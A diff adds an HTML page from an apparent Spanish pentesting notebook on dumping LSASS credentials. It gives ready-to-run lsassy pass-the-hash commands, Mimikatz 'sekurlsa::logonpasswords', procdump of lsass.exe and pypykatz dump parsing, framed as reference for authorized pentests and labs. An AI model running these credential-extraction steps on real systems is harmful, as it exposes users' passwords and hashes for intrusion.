@@ -1,0 +1,95 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>LSASS | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="lsass">
+          <div class="note-tabbar">
+            <span>LSASS</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Post-Explotación/Windows/Dumping hashes</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">post-explotación / windows / dumping hashes</p>
+            <h2>LSASS</h2>
+
+            <p>LSASS ejecuta el subsistema LSA y puede mantener credenciales, hashes o material de autenticación en memoria. El volcado de este proceso requiere privilegios elevados y debe limitarse a laboratorios o pentests autorizados.</p>
+
+            <p><code>LSASS</code>: Proceso que corre el sistema <code>LSA</code> y almacena <code>secretos/hashes</code> en <code>Memoria</code></p>
+            <h2>Dumpear proceso LSASS</h2>
+            <p><span class="notebook-review-note">Aviso: Requiere permisos elevados de <code>Administrator</code> para extraer <code>Hashes</code></span></p>
+            <p><a href="https://github.com/login-securite/lsassy">lsassy</a></p>
+            <section class="code-card">
+              <h3>Kali: Dumpear LSASS</h3>
+              <pre><code># Credenciales Admin Local 
+lsassy -d &lt;dominio.htb&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;ip_target&gt;
+# Hash Admin Local
+lsassy -d dominio.htb -u &lt;user&gt; -H &#x27;:NT&#x27; &lt;ip_target&gt;
+lsassy -d dominio.htb -u &lt;user&gt; -H &#x27;:027ae3139c0b6e47d3825660c1ede923&#x27; &lt;ip_target&gt;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Windows: Dumpear LSASS</h3>
+              <pre><code>mimikatz.exe # Iniciar Mimikatz
+privilege::debug # Habilita privilegio SeDebugPrivilege
+sekurlsa::logonpasswords # Extrae credenciales</code></pre>
+            </section>
+            <h2>Dumpear fichero lsass.dmp</h2>
+            <section class="code-card">
+              <h3>Windows: Extraer lsasss.dmp</h3>
+              <pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp # Descargar lsass.dmp</code></pre>
+            </section>
+            <p>Ruta Windows de <code>lsass.dmp</code>: <code>Administrador de Tareas</code> -> <code>Details</code> -> <code>lsass.exe</code> -> <code>Create Dump File</code></p>
+            <section class="code-card">
+              <h3>Kali: Dumpear lsass.dmp</h3>
+              <pre><code>pypykatz lsa minidump &lt;lsass.dmp&gt;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Windows: Dumpear lsass.dmp</h3>
+              <pre><code>mimikatz.exe # Iniciar Mimikatz
+privilege::debug # Habilita privilegio SeDebugPrivilege
+sekurlsa::minidump lsass.dmp # Carga el dumpeo de la memoria
+sekurlsa::logonpasswords # Extrae credenciales</code></pre>
+            </section>
+            <p>Relacionado: <a href="/notebook/escalada-privilegios/windows/privilegios/debug.html">privilegio Debug</a>.</p>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>post_explotacion</span>
+              <span>dumping_hashes</span>
+              <span>lsass</span>
+              <span>mimikatz</span>
+              <span>pypykatz</span>
+              <span>lsassy</span>
+              <span>sedebugprivilege</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
